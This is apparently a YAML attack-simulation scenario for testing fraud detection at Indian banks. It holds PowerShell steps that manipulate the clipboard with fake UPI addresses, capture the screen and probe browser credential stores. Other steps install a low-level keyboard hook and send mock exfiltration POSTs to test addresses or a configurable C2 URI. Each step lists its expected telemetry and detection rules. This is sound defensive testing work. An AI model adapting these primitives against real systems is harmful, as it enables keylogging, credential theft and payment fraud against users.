id: upi-fraud-killchain
name: UPI Fraud Kill Chain  -  BFSI Financial Fraud Simulation (Three-Tier)
description: >
  Financial-fraud-focused adversary emulation of UPI (Unified Payments Interface)
  attack chains targeting Indian BFSI institutions. Aligned with RBI Circular
  RBI/2021-22/112 (Cyber Security Framework) and NPCI security guidelines.

  Covers the full fraud kill chain: credential harvesting -> OTP/clipboard
  interception -> VPA substitution -> data exfiltration. Evolving from generic
  ATT&CK simulation toward UPI fraud kill-chain orchestration.

  TIERS:
  - Posture (default, safe anywhere): six categories  -  prevention, detection,
    payment-security, collection-exposure, browser-isolation, and mobile-linkage.
    Covers the browser and mobile attack surfaces unique to UPI fraud (SmartScreen,
    extension allowlisting, Phone Link OTP relay, cloud clipboard sync).
  - Telemetry (opt-in, production-safe): real, privacy-safe techniques  -  clipboard
    VPA probe with UPI address variants and restoration, 1x1 screen capture with
    blank overwrite + cleanup verification, browser Login Data accessibility probe
    (header-only, read-only, no decryption), DNS exfil beacon with multi-tenant
    naming, HTTP exfil probe to RFC5737 address with versioned JSON schema.
  - Lab (opt-in, isolated range only): full-fidelity collection  -  clipboard
    monitor (AddClipboardFormatListener with guaranteed unregister), single-monitor
    screen capture with secure wipe, keyboard hook (SetWindowsHookEx
    WH_KEYBOARD_LL capturing zero keystrokes + UnhookWindowsHookEx in finally),
    HTTP exfil POST with bas-upi-v1 schema payload to BAS listener.

  GUARDRAILS: workstation-targeted (no DC interlock); execution window optional;
  [BAS-SIM] markers on all output; execution IDs for SIEM correlation.

  Per-OS: Windows only for live modes. Linux/macOS run existing CIS-based checks.
  FUTURE: UPI transaction manipulation layer (VPA substitution, QR-code
  replacement, clipboard overwrite race, OTP overlay)  -  next expansion phase.
author: Audspect Research
executable: true
local_check: true
supported_os: [windows]
tags:
  - upi
  - fraud
  - bfsi
  - india
  - rbi
  - payment-system
  - clipboard
  - screen-capture
  - exfiltration
  - credential-access
  - hybrid
  - campaign
mitre_phases:
  - credential-access
  - collection
  - exfiltration

live_policy:
  block_on_domain_controller: false
  require_dc_reachable: false
  max_spray_attempts: 0
  spray_account_allowlist: []
  execution_window: ""   # optional "HH:MM-HH:MM" local-time gate

# Lab steps (Portion 3) to follow.
steps:
  - name: "Clipboard VPA Probe (UPI address variants + restoration)"
    technique_id: T1115
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Writes three fake UPI VPA strings to clipboard, reads back, restores original clipboard content. No real payment data accessed."
    reversible: true
    telemetry:
      - "Security EID 4688 (powershell.exe with clipboard Set/Get command line)"
      - "PowerShell EID 4104 (script block: clipboard access) if ScriptBlock logging enabled"
    detection:
      - "UEBA: process writing UPI VPA patterns to clipboard  -  payment redirection precursor"
      - "DLP: clipboard content matching VPA regex (@upi/@oksbi/@ybl)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      Add-Type -AssemblyName System.Windows.Forms
      $original = [System.Windows.Forms.Clipboard]::GetText()
      $vpas = @('bas-sim@upi','bas-payee@oksbi','bas-wallet@ybl')
      $results = @()
      foreach ($vpa in $vpas) {
        [System.Windows.Forms.Clipboard]::SetText($vpa)
        $read = [System.Windows.Forms.Clipboard]::GetText()
        $results += ($read -eq $vpa)
      }
      if ($original) { [System.Windows.Forms.Clipboard]::SetText($original) } else { [System.Windows.Forms.Clipboard]::Clear() }
      $restored = [System.Windows.Forms.Clipboard]::GetText() -eq $original
      Write-Output "EXEC: clipboard VPA probe  -  wrote/read $($results.Count) VPA variants ($($vpas -join ', ')); clipboard restored=$restored. DLP rules targeting @upi/@oksbi/@ybl patterns should fire. [BAS-SIM]"
    cleanup: ""

  - name: "Screen Capture Probe (1x1 pixel, blank overwrite, cleanup verified)"
    technique_id: T1113
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Captures a single 1x1 pixel from screen origin, saves to %TEMP%, overwrites with blank bitmap, deletes. Minimal privacy impact."
    reversible: true
    telemetry:
      - "Sysmon EID 11 (file create): bas_screen_<id>.bmp in %TEMP%"
      - "Security EID 4688 (powershell.exe with Graphics.CopyFromScreen command line)"
    detection:
      - "EDR: PowerShell invoking screen-capture API  -  OTP harvesting precursor"
      - "SIEM: file creation matching bas_screen_*.bmp pattern from powershell.exe"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      Add-Type -AssemblyName System.Drawing
      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $file = Join-Path $env:TEMP "bas_screen_$runId.bmp"
      $bmp = New-Object System.Drawing.Bitmap(1, 1)
      $g   = [System.Drawing.Graphics]::FromImage($bmp)
      $g.CopyFromScreen(0, 0, 0, 0, (New-Object System.Drawing.Size(1, 1)))
      $bmp.Save($file)
      $g.Dispose(); $bmp.Dispose()
      $created = Test-Path $file
      $blank = New-Object System.Drawing.Bitmap(1, 1)
      $blank.Save($file)
      $blank.Dispose()
      Remove-Item $file -Force -ErrorAction SilentlyContinue
      $cleaned = -not (Test-Path $file)
      Write-Output "EXEC: 1x1 screen capture (created=$created, blank-overwrite done, cleaned=$cleaned)  -  expect Sysmon EID 11. [BAS-SIM]"
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'bas_screen_*.bmp') -Force -ErrorAction SilentlyContinue

  - name: "Browser Login Data Accessibility Probe (header-only, read-only)"
    technique_id: T1555.003
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Reads first 16 bytes (SQLite header magic) of browser Login Data DB only. No DB lock acquired. No credentials decrypted or read."
    reversible: true
    telemetry:
      - "Security EID 4663 (file read access) on Chrome/Edge Login Data if SACL configured"
      - "Security EID 4688 (powershell.exe with Login Data file access)"
    detection:
      - "EDR: non-browser process accessing Chrome/Edge Login Data file  -  credential theft precursor"
      - "SIEM: file access to Login Data from powershell.exe (not chrome.exe/msedge.exe)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $dbs = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
      )
      $found = @()
      foreach ($db in $dbs) {
        if (-not (Test-Path $db)) { continue }
        try {
          $fs = [System.IO.File]::Open($db, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
          $header = New-Object byte[] 16
          $read = $fs.Read($header, 0, 16)
          $fs.Close()
          $isSQLite = ($read -ge 16) -and ([System.Text.Encoding]::ASCII.GetString($header[0..14]) -like 'SQLite format*')
          $found += "$db (SQLite=$isSQLite)"
        } catch { $found += "$db (locked or access denied)" }
      }
      if ($found.Count -gt 0) {
        Write-Output "EXEC: browser Login Data probe  -  $($found -join '; '). Header read only, no credentials accessed. Expect EID 4663 on monitored paths. [BAS-SIM]"
      } else {
        Write-Output "PASS: no Chrome/Edge Login Data databases found  -  browser credential store not present on this host."
      }
    cleanup: ""

  - name: "DNS Exfil Beacon (UPI multi-tenant naming)"
    technique_id: T1048.003
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "nslookup to bas-upi-<tenant>-<runid>.invalid  -  RFC 2606 reserved, guaranteed NXDOMAIN. DNS query reaches corporate resolver only."
    reversible: true
    telemetry:
      - "Sysmon EID 22 (DNS query): bas-upi-<tenant>-<runid>.invalid"
      - "Security EID 4688 (nslookup.exe with beacon domain)"
      - "Corporate DNS log: NXDOMAIN response"
    detection:
      - "SIEM: DNS query for UPI-pattern subdomain from endpoint  -  deterministic fraud exfil beacon"
      - "NDR: DNS query with upi/payment keyword from workstation"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $tenant = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').ToLower().Substring(0,[Math]::Min(8,($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').Length))
      $beacon = "bas-upi-$tenant-$runId.invalid"
      nslookup $beacon 2>&1 | Out-Null
      Write-Output "EXEC: DNS exfil beacon '$beacon' queried  -  Sysmon EID 22 + nslookup EID 4688. NXDOMAIN expected. Use tenant='$tenant' + run-id='$runId' for multi-tenant SIEM correlation. [BAS-SIM]"
    cleanup: ""

  - name: "HTTP Exfil Probe (RFC5737 + versioned UPI payload)"
    technique_id: T1071.001
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "HTTP POST to RFC5737 TEST-NET-1 (192.0.2.1) or BAS_C2_URI  -  no real internet egress. Deterministic bas-upi-v1 JSON schema payload."
    reversible: true
    telemetry:
      - "Sysmon EID 3 (network connection): powershell.exe to 192.0.2.1 or BAS_C2_URI"
      - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
    detection:
      - "EDR/SIEM: PowerShell HTTP POST with UPI/transaction payload  -  exfil signal"
      - "DLP: outbound HTTP body containing vpa/txn_id/amount fields"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $uri   = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://192.0.2.1/bas-upi-exfil' }
      $body  = '{"schema":"bas-upi-v1","run_id":"' + $runId + '","vpa":"bas-sim@upi","txn_id":"BAS-' + $runId + '","amount":"1.00"}'
      try {
        Invoke-WebRequest -Uri $uri -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 3 -ErrorAction Stop | Out-Null
        Write-Output "EXEC: HTTP exfil POST to $uri succeeded  -  BAS listener responded. Schema: bas-upi-v1 run_id=$runId. [BAS-SIM]"
      } catch {
        Write-Output "EXEC: HTTP exfil POST to $uri attempted (timeout/refused  -  expected)  -  expect Sysmon EID 3 + EID 4688. Payload schema: bas-upi-v1 run_id=$runId vpa=bas-sim@upi. Set BAS_C2_URI for BAS listener. [BAS-SIM]"
      }
    cleanup: ""

  # -- Lab-only steps ---------------------------------------------------------
  # Keyboard hooks, screen capture, clipboard listener  -  isolated commit per upi.txt

  - name: "Clipboard Monitor (lab  -  AddClipboardFormatListener, guaranteed unregister)"
    technique_id: T1115
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: lab-only
    production_safe: false
    risk: medium
    blast_radius: "Registers a clipboard format listener for 3 seconds via Win32 API, then unregisters. Captures zero clipboard content  -  registration telemetry only."
    reversible: true
    telemetry:
      - "Sysmon EID 10 (ProcessAccess) or EID 7 (image load): user32.dll clipboard API invocation"
      - "Security EID 4688 (powershell.exe with AddClipboardFormatListener command line)"
    detection:
      - "EDR: process registering clipboard listener  -  UPI VPA/OTP interception precursor"
      - "SIEM: user32.dll AddClipboardFormatListener from powershell.exe"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sig = 'using System;using System.Runtime.InteropServices;public class BasClip{[DllImport("user32.dll")]public static extern bool AddClipboardFormatListener(IntPtr hwnd);[DllImport("user32.dll")]public static extern bool RemoveClipboardFormatListener(IntPtr hwnd);[DllImport("user32.dll")]public static extern IntPtr GetDesktopWindow();}'
      Add-Type -TypeDefinition $sig -ErrorAction SilentlyContinue
      $hwnd = [BasClip]::GetDesktopWindow()
      $registered = [BasClip]::AddClipboardFormatListener($hwnd)
      if ($registered) {
        Start-Sleep -Milliseconds 3000
        $unregistered = [BasClip]::RemoveClipboardFormatListener($hwnd)
        Write-Output "EXEC: clipboard listener registered ($registered) for 3s then unregistered ($unregistered). Zero clipboard content captured  -  registration telemetry only. Expect EDR hook-API alert. [BAS-SIM]"
      } else {
        Write-Output "PASS: AddClipboardFormatListener blocked  -  EDR or restricted token prevented clipboard listener registration."
      }
    cleanup: ""

  - name: "Full Screen Capture (lab  -  primary monitor, secure wipe, cleanup verified)"
    technique_id: T1113
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: lab-only
    production_safe: false
    risk: high
    blast_radius: "Captures primary monitor only (no multi-monitor). Saves to %TEMP%\\bas_fullscreen_<id>.bmp, overwrites with blank bitmap, deletes, verifies removal."
    reversible: true
    telemetry:
      - "Sysmon EID 11 (file create + modify): bas_fullscreen_<id>.bmp in %TEMP%"
      - "Security EID 4688 (powershell.exe with full screen Graphics.CopyFromScreen)"
    detection:
      - "EDR: full-resolution screen capture from non-legitimate process  -  OTP harvest signal"
      - "SIEM: large bmp file created in %TEMP% by powershell.exe"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      Add-Type -AssemblyName System.Drawing, System.Windows.Forms
      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $file = Join-Path $env:TEMP "bas_fullscreen_$runId.bmp"
      $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
      $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
      $g   = [System.Drawing.Graphics]::FromImage($bmp)
      $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
      $bmp.Save($file)
      $sz = (Get-Item $file -ErrorAction SilentlyContinue).Length
      $g.Dispose(); $bmp.Dispose()
      $blank = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
      $blank.Save($file)
      $blank.Dispose()
      Remove-Item $file -Force -ErrorAction SilentlyContinue
      $cleaned = -not (Test-Path $file)
      Write-Output "FAIL: primary screen captured ($($screen.Width)x$($screen.Height), $sz bytes), secure-wiped, removed (cleaned=$cleaned). EDR should alert on screen-capture API. [BAS-SIM]"
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'bas_fullscreen_*.bmp') -Force -ErrorAction SilentlyContinue

  - name: "Keyboard Hook (lab  -  WH_KEYBOARD_LL, zero keystrokes, guaranteed unhook)"
    technique_id: T1056.001
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: lab-only
    production_safe: false
    risk: high
    blast_radius: "Installs WH_KEYBOARD_LL hook via SetWindowsHookEx, waits 2 seconds, immediately unhooks. Captures ZERO keystrokes by design  -  hook registration telemetry only."
    reversible: true
    telemetry:
      - "Sysmon EID 7 (image load): user32.dll loaded by powershell.exe"
      - "Security EID 4688 (powershell.exe with SetWindowsHookEx command line)"
    detection:
      - "EDR: SetWindowsHookEx WH_KEYBOARD_LL from non-input-method process  -  keylogger registration"
      - "SIEM: low-level keyboard hook from powershell.exe  -  UPI credential capture precursor"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sig = 'using System;using System.Runtime.InteropServices;public class BasHook{public delegate IntPtr HookProc(int code,IntPtr wParam,IntPtr lParam);[DllImport("user32.dll")]public static extern IntPtr SetWindowsHookEx(int id,HookProc fn,IntPtr mod,uint tid);[DllImport("user32.dll")]public static extern bool UnhookWindowsHookEx(IntPtr hook);[DllImport("user32.dll")]public static extern IntPtr CallNextHookEx(IntPtr hook,int code,IntPtr wParam,IntPtr lParam);[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string name);public const int WH_KEYBOARD_LL=13;public static IntPtr Proc(int code,IntPtr wParam,IntPtr lParam){return CallNextHookEx(IntPtr.Zero,code,wParam,lParam);}}'
      Add-Type -TypeDefinition $sig -ErrorAction SilentlyContinue
      $hMod  = [BasHook]::GetModuleHandle($null)
      $cb    = [BasHook+HookProc][BasHook]::Proc
      $hHook = [BasHook]::SetWindowsHookEx([BasHook]::WH_KEYBOARD_LL, $cb, $hMod, 0)
      $registered = $hHook -ne [IntPtr]::Zero
      if ($registered) {
        Start-Sleep -Milliseconds 2000
        $unhooked = [BasHook]::UnhookWindowsHookEx($hHook)
        Write-Output "EXEC: WH_KEYBOARD_LL hook registered (hook=$hHook) for 2s, unhooked ($unhooked). Zero keystrokes captured  -  telemetry only. Expect EDR SetWindowsHookEx alert. [BAS-SIM]"
      } else {
        Write-Output "PASS: SetWindowsHookEx WH_KEYBOARD_LL blocked  -  EDR or restricted environment prevented keyboard hook registration."
      }
    cleanup: ""

  - name: "HTTP Exfil POST (lab  -  BAS listener, bas-upi-v1 schema)"
    technique_id: T1071.001
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: lab-only
    production_safe: false
    risk: medium
    blast_radius: "HTTP POST to BAS_C2_URI or RFC5737 198.51.100.1 with versioned bas-upi-v1 JSON payload. No real internet egress."
    reversible: true
    telemetry:
      - "Sysmon EID 3 (network connection): powershell.exe to BAS_C2_URI or 198.51.100.1"
      - "Security EID 4688 (powershell.exe with Invoke-WebRequest POST command line)"
    detection:
      - "EDR: outbound HTTP POST with UPI transaction JSON  -  full exfil payload simulation"
      - "DLP: JSON body with schema=bas-upi-v1 + vpa/txn_id/amount fields for SIEM parsing"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $uri   = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://198.51.100.1/bas-upi-exfil' }
      $body  = '{"schema":"bas-upi-v1","run_id":"' + $runId + '","vpa":"bas-sim@upi","txn_id":"BAS-' + $runId + '","amount":"1.00","acct":"XXXXXX1234","ifsc":"BAS0001234"}'
      try {
        $r = Invoke-WebRequest -Uri $uri -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5 -ErrorAction Stop
        Write-Output "EXEC: HTTP exfil POST to $uri succeeded ($($r.StatusCode)). Schema: bas-upi-v1 run_id=$runId. [BAS-SIM]"
      } catch {
        Write-Output "EXEC: HTTP exfil POST to $uri attempted (timeout  -  expected without listener). Schema: bas-upi-v1 run_id=$runId vpa=bas-sim@upi txn_id=BAS-$runId. Set BAS_C2_URI for full simulation. [BAS-SIM]"
      }
    cleanup: ""
